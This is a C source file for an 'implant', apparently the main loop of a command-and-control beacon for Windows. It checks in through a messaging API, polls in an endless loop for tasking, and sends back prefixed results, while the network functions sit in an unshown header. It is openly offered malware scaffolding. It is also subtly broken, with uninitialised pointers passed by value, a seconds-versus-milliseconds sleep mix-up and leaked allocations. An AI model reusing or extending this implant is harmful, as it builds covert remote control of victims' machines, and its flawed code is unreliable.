#include <stdio.h>
#include "SendRecv.h"

int Sleep(int secs) {
    SleepEx((DWORD)secs, FALSE);
    return 0;
}

LPSTR AddPrefixToResult(LPSTR str, LPSTR prefix) {
    size_t prefixLength = strlen(prefix);
    size_t strLength = strlen(str);
    size_t newLength = prefixLength + strLength + 1;

    LPSTR newStr = (LPSTR)malloc(newLength);

    strcpy_s(newStr, newLength, prefix);
    strcat_s(newStr, newLength, str);

    return newStr;
}

int main() {
    
    LPSTR result;
    LPSTR id;
    int status = SendTheMessage("Implant Checked In!", id);
    if (status == 1) {
        return 1;
    }

   while (true) {
        Sleep(10000);
        status = RecvTheMessage(id, result);
        if (status == 1) {
            return 1;
        }
        Sleep(1000);
        if (strcmp(result, "") != 0) {
            LPSTR mResult = AddPrefixToResult(result, (LPSTR)"Result: ");
            if (strlen(mResult) > 4087) {
                LPSTR mResult = (LPSTR)"Result: The length of output of command is greater than 4087, cannot send over api\n";
                UpdateTheMessage(mResult, id);
                result = (LPSTR)"";
            }
            else {
                UpdateTheMessage(mResult, id);
                result = (LPSTR)"";
            }
        }
    }
    return 0;
}